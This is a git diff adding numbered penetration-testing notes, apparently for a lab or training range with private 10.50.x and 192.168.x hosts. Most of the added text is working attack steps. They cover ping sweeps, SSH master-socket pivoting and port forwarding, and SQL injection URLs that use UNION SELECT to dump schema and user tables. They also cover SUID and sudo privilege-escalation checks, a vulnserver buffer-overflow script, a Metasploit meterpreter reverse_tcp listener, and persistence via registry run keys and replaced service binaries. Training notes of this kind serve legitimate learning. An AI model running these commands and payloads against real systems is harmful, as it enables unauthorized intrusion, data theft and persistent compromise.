@@ -705,7 +705,33 @@ ping sweep for a large subnet and then do nmap for individuals
 9)  the get method is putting it in the url, go via F12, go to network click on post, then request click raw form
 10)  make a master socket to the first box: ssh -M -S /tmp/grey  -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null user2@10.50.41.7
 11)  run sudo -l, and find / -type f -perm /6000 -ls  2> /dev/null
-12)  cat /etc/hosts, /etc/passwd, /etc/crontab,
+12)  cat /etc/hosts, /etc/passwd, /etc/crontab
+13)  for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+14)  set up proxy chains ssh -S /tmp/grey a -O forward -D 9050
+15)  nmap the other ips
+16)  run --scripts http-enum
+17)  ssh -S /tmp/grey a -O forward -L 7996:192.168.181:80
+18)  ssh -S /tmp/grey a -O forward -L 7997:192.168.181:22
+19)  goes to 80 does sql injection and tested it: 127.0.0.1:7996/pick.php?product=7 OR 1=1;
+20)  127.0.0.1:7996/pick.php?product=7 UNION select 1,2,3 -> sees its messed up so not its 1,3,2
+21)  127.0.0.1:7996/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns WHERE table_schema=database()
+22)  127.0.0.1:7996/pick.php?product=7 UNION SELECT user_id,username,name FROM siteusers.users
+23)  ssh to the next box and make a new master socket
+24)  once on the box rescan the network via for loop
+25)  run the find perms 
+26)  do sudo -l if gets hits go to GTFO bins see what we can do -> priv execlate
+27)  cat /etc/host, /etc/passwd, /etc/crontab
+28)  set up dynamic host to / tunnel to get to the box
+29)  scan the new box
+30)  if it has 9999 its vulserver -> use my scripts/Winbuff.py
+31)  open msfcon -> multi/handler -> set payload windows/meterpreter/reverse_tcp -> set lhost 0.0.0.0 -> set lport 4444
+32)  go to the box via xfreerdp -> do to services via mmc -> look at regedit hklm\..\run,runonce -> look at scheduled tasks
+33)  replace the binary -> restart?
+34)  look at taskscheduler
+35)  look at registy
+
+demo-linux priv 10.50.45.252
+demo-web_exploit_sql 10.50.43.238 /union.html
 
 
 
